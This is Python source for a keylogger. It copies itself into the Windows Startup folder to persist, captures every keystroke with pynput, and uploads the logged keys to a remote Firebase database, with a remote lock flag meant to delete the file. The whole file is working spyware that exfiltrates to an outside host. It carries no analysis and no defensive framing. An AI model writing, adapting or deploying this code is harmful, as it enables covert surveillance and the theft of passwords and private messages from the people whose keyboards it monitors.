
from threading import Thread
from datetime import datetime
import firebase_admin
from firebase_admin import db
from ping3 import ping
from pynput.keyboard import Listener, Key
import platform
import shutil
os = platform.system() + platform.release()
#coping this file into sturtup folder
pattern = __file__
pattern = pattern.split("\\")[:3]
path = __file__.split("\\")

import os

try:

    shutil.copy("/".join(path), f'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp')
except PermissionError:
    print("PermissionError!")
# C:\Users\Arsbul Programming\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup



all_keys = []
all_n = {"enter": "\n", "tab": "\t"}

cred_obj = firebase_admin.credentials.Certificate('kreds.json')
app_d = firebase_admin.initialize_app(cred_obj, {
    'databaseURL': "https://keyloggerpython-3393e-default-rtdb.firebaseio.com/"
})
ref = db.reference(f'/lock/')
if ref.get():
    os.remove(__name__)

d = {"month": datetime.now().month, "day": datetime.now().day, "hour": datetime.now().hour}
ref = db.reference(f'/keys/{d}/keys')
all_keys = ref.get(all_keys)
if not all_keys:
    all_keys = []


def up_data():
    global all_keys
    print(123)
    p = ping('keyloggerpython-3393e-default-rtdb.firebaseio.com', timeout=1, unit="ms")
    # print(p)
    try:
        if p != False and p != None and p < 300:
            ref = db.reference(f'/keys/{datetime.now().month}@{datetime.now().day}@{datetime.now().hour}/')

            ref.set({"keys": all_keys,
                     "date": {"month": datetime.now().month, "day": datetime.now().day, "hour": datetime.now().hour}})


    except:
        pass


def on_press(ev):  # The function that's called when a key is pressed
    global all_keys

    try:
        print(ev.char)
        all_keys.append(ev.char)
    except AttributeError:
        if ev == Key.space:  # If space was pressed, write a space
            all_keys.append(" ")
        elif ev == Key.enter:  # If enter was pressed, write a new line
            all_keys.append("\n")

        elif ev == Key.tab:  # If tab was pressed, write a tab
            all_keys.append("\t")

    th = Thread(target=up_data)
    th.start()
with Listener(
        on_press=on_press) as listener:
    listener.join()